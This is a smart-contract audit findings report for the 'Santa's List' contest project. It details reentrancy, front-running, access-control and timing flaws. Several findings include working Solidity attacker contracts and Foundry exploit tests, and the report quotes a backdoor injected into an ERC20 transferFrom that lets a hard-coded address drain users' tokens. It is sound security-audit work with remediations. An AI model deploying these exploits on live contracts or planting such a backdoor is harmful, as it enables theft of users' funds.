# First Flight #5: Santa's List - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Reentrancy via buyPresent() allows you to continuously create new tokens](#H-01)
    - ### [H-02. SantaToken is prone to frontrunning during approval](#H-02)
    - ### [H-03. SantaToken uses malicious ERC-20 implementation](#H-03)
    - ### [H-04. Reentrancy in collectPresent()](#H-04)
    - ### [H-05. Incorrect logic buyPresent() results in burning of someone's tokens](#H-05)
    - ### [H-06. CHRISTMAS_2023_BLOCK_TIME incorrectly set](#H-06)
    - ### [H-07. testCheckList() can be called by each for each](#H-07)
- ## Medium Risk Findings
    - ### [M-01. Parameters of events are not indexed](#M-01)
- ## Low Risk Findings
    - ### [L-01. collectNFT function has another name](#L-01)
    - ### [L-02. Santa can collect the presents for himself](#L-02)
    - ### [L-03. No references to PURCHASED_PRESENT_COST](#L-03)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://www.codehawks.com/contests/clpba0ama0001ywpabex01hrp)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 7
   - Medium: 1
   - Low: 3


# High Risk Findings

## <a id='H-01'></a>H-01. Reentrancy via buyPresent() allows you to continuously create new tokens            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L174

## Summary
It's possible to mint any amount of tokens using `buyPresent` function when the caller is NICE or EXTRA_NICE and has at least 1e18 Santa tokens on the balance.
## Vulnerability Details
If the caller is a contract, the issue occurs because it's possible to call `collectTokens()` which is vulnerable to reentrancy. 

Here is possible attacker's contract: 
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

interface ISantasList {
    function collectPresent() external;
    function buyPresent(address presentReceiver) external;
    function balanceOf(address owner) external returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract BuyPresentAttack is Ownable {
    ISantasList santasList;

    uint256 counter = 0;
    uint256 public constant WISHED_AMOUNT_OF_TOKENS = 500;

    constructor(address _santasListAddress) Ownable(msg.sender) {
        santasList = ISantasList(_santasListAddress);
    }

    function attack(address otherAddress) public onlyOwner {
        // Call the vulnarable function.
        santasList.buyPresent(otherAddress);
    }

    // When msg.sender is a contract,
    // _safeMint from SantasList will trigger onERC721Received()
    function onERC721Received(address from, address, /*to*/ uint256 tokenId, bytes memory /* data */ )
        public
        returns (bytes4)
    {
        if (counter < WISHED_AMOUNT_OF_TOKENS) {
            // transfer tokens to attacker
            // in order to bypass balance check in collectPresent()
            santasList.transferFrom(from, owner(), tokenId);
            counter++;
            santasList.collectPresent();
        }

        counter = 0;

        // Return onERC721Received.selector
        // in order not to revert in _safeMint() -> __checkOnERC721Received()
        return 0x150b7a02;
    }
}
``` 
Attack test: 
```
function testBuyPresentAttack() public {
    // We have a user who is NICE
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.NICE);
    santasList.checkTwice(user, SantasList.Status.NICE);
    vm.stopPrank();

    // Mint tokens for the user and verify their amount
    vm.prank(address(santasList));
    santaToken.mint(user);
    assertEq(santaToken.balanceOf(user), 1e18);

    // Setting the time after Christmas
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    // Verify that the attacker had no tokens initially
    assertEq(santasList.balanceOf(attacker), 0);
    vm.prank(attacker);
    buyPresentAttack.attack(address(user));

    // Verify that the user has no tokens now
    assertEq(santaToken.balanceOf(user), 0);

    // Verify that the attacker owns tokens now
    assertEq(santasList.balanceOf(attacker), buyPresentAttack.WISHED_AMOUNT_OF_TOKENS());
}
```
## Impact
High. The logic of the token distribution is broken by the vulnerability.  
## Tools Used
Manual check.
## Recommendations
Consider adding [reentrancy guard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard) to `collectPresent()`.
## <a id='H-02'></a>H-02. SantaToken is prone to frontrunning during approval            

### Relevant GitHub Links
	
https://github.com/PatrickAlphaC/solmate-bad/blob/c3877e5571461c61293503f45fc00959fff4ebba/src/tokens/ERC20.sol#L64

## Summary
It is possible to spend more token amount than what has been approved.

## Vulnerability Details
Approvals are used during the life cycle of any token.  As `SantaToken` inherits ERC20 contract an approval mechanism is there in place: 
```
function approve(address spender, uint256 amount) public virtual returns (bool) {
    allowance[msg.sender][spender] = amount;

    emit Approval(msg.sender, spender, amount);

    return true;
}
```
Let's consider the following scenario:
- _A_ approves 100 Santa tokens to _B_ with `approve(B, 100)`
- _A_ decides to decrease the allowance of _B_ to 20 tokens with `approve(B, 20)`
- _B_ sees the `approve(B, 20)` transaction in mempool
- _B_ pays higher fee, so that his `transferFrom(A, B, 100)` transaction comes before `approve(B, 20)` transaction made by _A_
- _B_ received 100 Santa tokens and now calls `transferFrom(A, B, 20)` 
- In total _B_ receives 120 tokens which is more than _A_ expects

## Impact
High, because it can be implemented relatively easy if the malicious actor has access and knowledge of mempool. 
## Tools Used
Manual check
## Recommendations
Utilize safe methods to increasing or decreasing allowance. E.g. inherit from OpenZeppelin ERC20 and use [increaseAllowance](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#ERC20-increaseAllowance-address-uint256-) / [decreaseAllowance](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#ERC20-decreaseAllowance-address-uint256-) accordingly. 
## <a id='H-03'></a>H-03. SantaToken uses malicious ERC-20 implementation            

### Relevant GitHub Links
	
https://github.com/PatrickAlphaC/solmate-bad/blob/c3877e5571461c61293503f45fc00959fff4ebba/src/tokens/ERC20.sol#L86

## Summary
Malicious code was inserted into the original Solmate _ERC20.sol_ file. This code allows an attacker to transfer tokens to themselves from other users' wallets.
## Vulnerability Details
The following piece of code was injected into `transferFrom` function:
```
// hehehe :)
// https://arbiscan.io/tx/0xd0c8688c3bcabd0024c7a52dfd818f8eb656e9e8763d0177237d5beb70a0768d
if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
    balanceOf[from] -= amount;
    unchecked {
        balanceOf[to] += amount;
    }
    emit Transfer(from, to, amount);
    return true;
}
```
A test shows that the assumption about this kind of attack is correct: 
```
function testMaliciousTransferFrom() public {
    // SantaToken.mint() mints 1e18 tokens
    uint256 expectedUserBalanceAfterMint = 1e18;

    // Mint tokens for the user
    vm.prank(address(santasList));
    santaToken.mint(user);

    // Verification that the correct number of tokens have been minted.
    assertEq(santaToken.balanceOf(user), expectedUserBalanceAfterMint);

    // Bad actor tries to steal user's tokens
    address maliciousERC20Creator = 0x815F577F1c1bcE213c012f166744937C889DAF17;
    vm.prank(maliciousERC20Creator);
    santaToken.transferFrom(user, maliciousERC20Creator, expectedUserBalanceAfterMint);

    // Attacker has obtained tokens from the user
    assertEq(santaToken.balanceOf(maliciousERC20Creator), expectedUserBalanceAfterMint);
    assertEq(santaToken.balanceOf(user), 0);
}
```
The message left on blockchain is decoded into _"I am going to hack Santas Token!"_. The author of SantasList contract (see comment on line 55 of the file) has the same address as this bad actor.
## Impact
High. The probability of rug pull is very high. 
## Tools Used
Manual check.
## Recommendations
Remove malicious peace of code. Import dependencies from only from verified sources, e.g. from the official Solmate [repository](https://github.com/transmissions11/solmate).
## <a id='H-04'></a>H-04. Reentrancy in collectPresent()            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L155

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L161

## Summary
In `collectPresent()` it is possible to generate a huge number of tokens bypassing the rules.
## Vulnerability Details
The user of the `SantasList` can be either an EOA or another contract. If the caller of `SantasList` is a contract then it is necessary to pay attention to `_safeMint()` function in `_mintAndIncrement()`: `_safeMint()` calls `_checkOnERC721Received()` which allows to verify that a contract can receive ERC721 tokens. This can have security implications. 
Consider the following contract: 
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

interface ISantasList {
    function collectPresent() external;
    function balanceOf(address owner) external returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AttackerContract is Ownable {
    ISantasList santasList;

    uint256 counter = 0;

    // Here the attacker specifies how many tokens he
    // would like to generate in a single transaction.
    uint256 public constant WISHED_AMOUNT_OF_TOKENS = 500;

    constructor(address _santasListAddress) Ownable(msg.sender) {
        santasList = ISantasList(_santasListAddress);
    }

    function attack() public onlyOwner {
        // Call the vulnarable function.
        santasList.collectPresent();
    }

    // When msg.sender is a contract,
    // _safeMint from SantasList will trigger onERC721Received()
    function onERC721Received(address from, address, /*to*/ uint256 tokenId, bytes memory /* data */ )
        public
        returns (bytes4)
    {
        if (counter < WISHED_AMOUNT_OF_TOKENS) {
            // Each time transfer tokens to attacker
            // in order to bypass balance check in collectPresent()
            santasList.transferFrom(from, owner(), tokenId);
            counter++;
            santasList.collectPresent();
        }

        counter = 0;

        // Return onERC721Received.selector
        // in order not to revert in _safeMint() -> __checkOnERC721Received()
        return 0x150b7a02;
    }
}
```
A test below confirms that the attack succeeds:
```
function testCollectPresentAttack() public {
    // Assume that the attacker is someone with e.g. NICE status
    vm.startPrank(santa);
    santasList.checkList(attacker, SantasList.Status.NICE);
    santasList.checkTwice(attacker, SantasList.Status.NICE);
    vm.stopPrank();

    // Setting the time after Christmas
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    // Confirm that the attacker had no tokens before the attack
    assertEq(santasList.balanceOf(attacker), 0);

    // Perform the attack
    vm.prank(attacker);
    attackerContract.attack();

    // Confirm that the attacker now has wished amount of tokens
    assertEq(santasList.balanceOf(attacker), attackerContract.WISHED_AMOUNT_OF_TOKENS());
}
```

## Impact
High. `collectPresent()` allows attackers to generate as many tokens as they want.
## Tools Used
Manual check.
## Recommendations
Consider adding [reentrancy guard](https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard) to `collectPresent()`.
## <a id='H-05'></a>H-05. Incorrect logic buyPresent() results in burning of someone's tokens            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L172

## Summary
Function `buyPresent()` works incorrectly and allows anyone to burn anyone's tokens without permission.
## Vulnerability Details
A user can frame someone's address and burn their Santa tokens. See below:
```
function testBuyPresentMalfunction() public {
    // Santa sets the status of user to EXTRA NICE
    vm.startPrank(santa);

    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    // Setting the time after Christmas
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    // Let the user to collect his present.
    // As the user is EXTRA NICE he should get both ERC20 Santa tokens and NFT
    vm.startPrank(user);
    santasList.collectPresent();
    assertEq(santaToken.balanceOf(user), 1e18);
    assertEq(santasList.balanceOf(user), 1);
    vm.stopPrank();

    // An attacker wants burn someone else's tokens
    // and mint NFT for himself
    vm.startPrank(attacker);
    assertEq(santasList.balanceOf(attacker), 0);

    // Call of buyPresent() helps the attacker to reach his goal
    santasList.buyPresent(user);
    assertEq(santasList.balanceOf(user), 1); // NFT is generated for the user as well...
    assertEq(santaToken.balanceOf(user), 0); // But his Santa tokens have been burned.
    assertEq(santasList.balanceOf(attacker), 1); // Attacker mints Santa's NFT for himself
    vm.stopPrank();
}
```
## Impact
High. The implementation of the function and the ease of intentional or unintentional manipulation leads to a mess of user balances.
## Tools Used
Manual check.
## Recommendations
- `msg.sender` should only be able to burn their own tokens
- Consider to use `PURCHASED_PRESENT_COST` for buying
## <a id='H-06'></a>H-06. CHRISTMAS_2023_BLOCK_TIME incorrectly set            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L86

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L148

## Summary
The current value of CHRISTMAS_2023_BLOCK_TIME results in failing to start collecting gifts on time.
## Vulnerability Details
Although a `CHRISTMAS_2023_BLOCK_TIME` between `[Christmas 2023 - 24h; Christmas 2023 + 24h]` is acceptable,  the given value of this constant is out of this range. It prevents the game from being started at the right time. 

Anvil command:
```console
anvil --fork-url https://arbitrum-mainnet.infura.io/v3/{your_infura_api_key}
```
returns the following output:
```console
Fork
==================
Endpoint:       https://arbitrum-mainnet.infura.io/v3/{your_infura_api_key}
Block number:   156281728
Block hash:     0xa2aa527ce1fc5edb2beffa1f53a2767902244922e16af10e5f53c06075d03d3a
Chain ID:       42161
...
```
Block number stored in `CHRISTMAS_2023_BLOCK_TIME` is `1703480381`. Arbiscan Countdown [shows](https://arbiscan.io/block/countdown/1703480381) that expected date for this block is August 18, 2028. 
## Impact
High. It will not be possible to collect gifts, because the following condition in `collectPresent()` will revert during Christmas 2023:
```
if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
    revert SantasList__NotChristmasYet();
}
```
## Tools Used
Manual check.
## Recommendations
Value of `CHRISTMAS_2023_BLOCK_TIME` should be set around [162671717](https://arbiscan.io/block/countdown/162671717).
## <a id='H-07'></a>H-07. testCheckList() can be called by each for each            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L121

## Summary
Anyone can call `testCheckList()` function. This may affect gift allocation decisions.
## Vulnerability Details
According to the description of how the contract functions, the `testCheckList()' function can only be called by Santa. In reality, however, the function can be called by anyone. It is declared as external. It does not contain an access modifier, nor does it check that the code is actually called by Santa. In addition, anybody can set the status to anybody else. See the example below:
```
function testCheckListByUser() public {
    // The specific roles are not really important in this particular test.
    // The idea is to show: Anyone can set a status for anyone.
    vm.prank(user);
    // User sets status for himself
    santasList.checkList(user, SantasList.Status.NICE);
    assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.NICE));
    vm.stopPrank();

    vm.prank(santa);
    // Santa sets status for user
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.EXTRA_NICE));
    vm.stopPrank();

    vm.prank(attacker);
    // Attacker sets status for Santa
    santasList.checkList(santa, SantasList.Status.NAUGHTY);
    assertEq(uint256(santasList.getNaughtyOrNiceOnce(santa)), uint256(SantasList.Status.NAUGHTY));
    vm.stopPrank();
}
```
## Impact
High. Anyone can set the status they want. The legitimate status set by Santa can be overwritten. 
## Tools Used
Manual check.
## Recommendations
Apply `onlySanta()` modifier.
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Parameters of events are not indexed            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L93

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L94

## Summary
`CheckedOnce` and `CheckedTwice` events are not indexed, which could be a problem for the monitoring of the activity of the contract.
## Vulnerability Details
Non-indexed events can be a source of confusion for off-chain analysis tools.
## Impact
Medium. As can be seen from the other findings, the events are quite important for the logic of this particular type of contract. It would be possible for off-chain tools to identify problems more easily if the events were properly indexed. 
## Tools Used
Manual check.
## Recommendations
Add indexing: 
```
event CheckedOnce(address indexed person, Status indexed status);
event CheckedTwice(address indexed person, Status indexed status);
```

# Low Risk Findings

## <a id='L-01'></a>L-01. collectNFT function has another name            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L147

## Summary
Project's readme file mentions `collectNFT` function. This function doesn't exist.
## Vulnerability Details
There is a `collectPresent` function which does what `collectNFT` should do, so the naming is wrong.
## Impact
Low. May cause confusion for people who interact with the contract. 
## Tools Used
Manual check.
## Recommendations
Rename `collectPresent` to `collectNFT` in `SantasList` _or_ change `collectNFT` to `collectPresent` in README.
## <a id='L-02'></a>L-02. Santa can collect the presents for himself            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L147

## Summary
Santa can call the collectPresent() function. 
## Vulnerability Details
Since the logic of the contract assumes that only NICE and EXTRA NICE people can collect presents, and Santa is not part of any lists, this can be seen as an access issue. 

See the test below: 
```
function testCollectPresentBySanta() public {
    // Santa sets status for himself
    vm.startPrank(santa);
    santasList.checkList(santa, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(santa, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    // Setting the time after Christmas
    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    // Santa successfully gets his present
    vm.prank(santa);
    santasList.collectPresent();
    assertEq(santasList.balanceOf(santa), 1);
}
```
## Impact
Low. Although an access check is missing, this is not a security problem.
## Tools Used
Manual check.
## Recommendations
Check if `msg.sender` is Santa. For example:
```
error SantasList__SantaNotAllowed();
...
if (msg.sender != i_santa) {
   revert SantasList__SantaNotAllowed();
} 
```
## <a id='L-03'></a>L-03. No references to PURCHASED_PRESENT_COST            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L88

## Summary
`PURCHASED_PRESENT_COST` is not used.
## Vulnerability Details
The constant is not used anywhere in the code.
## Impact
Low. The fact that a variable is not in use is not in itself a vulnerability.
## Tools Used
Manual check
## Recommendations
It is necessary to check how the gift purchase feature works. There is a good chance that the function is not working properly. 


